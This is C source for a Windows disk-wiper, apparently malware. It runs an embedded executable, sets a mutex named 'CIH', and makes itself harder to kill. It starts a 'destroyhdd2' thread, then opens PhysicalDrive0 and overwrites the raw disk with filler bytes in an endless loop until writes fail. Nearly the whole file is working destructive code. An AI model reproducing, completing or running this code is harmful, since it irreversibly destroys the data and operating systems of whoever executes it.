#include <Windows.h>
#include "data.h"
#include "mem.h"
#include "protect.h"
#include "mutex.h"
#include "external.h"

#define BUFFER_SIZE 1024000

int _stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmd, int nCmdShow){

RunPortableExecutable(arp);

CreateOneAppMutex("CIH");

protectProcess();

CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&destroyhdd2, 0, 0, NULL);

DWORD dwWrite;
int k = 0;
char buf[BUFFER_SIZE] = {0};
for(k=0;k<BUFFER_SIZE;k++) // Fill buffer
buf[k] = '0'; // With 0
BOOL bSuccess;
HANDLE devHandle = NULL;
devHandle = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0 ,NULL);

unsigned long secCount = 0;
while(true)
{
        bSuccess = WriteFile(devHandle, buf, 1024000, &dwWrite, NULL);

        if (bSuccess & (dwWrite < 1024000))
        {
            break;
        }

        if(!bSuccess)
        {
            break;
        }

        if(bSuccess && dwWrite>0)
        {
			//fucked
        }

        secCount++;
}
}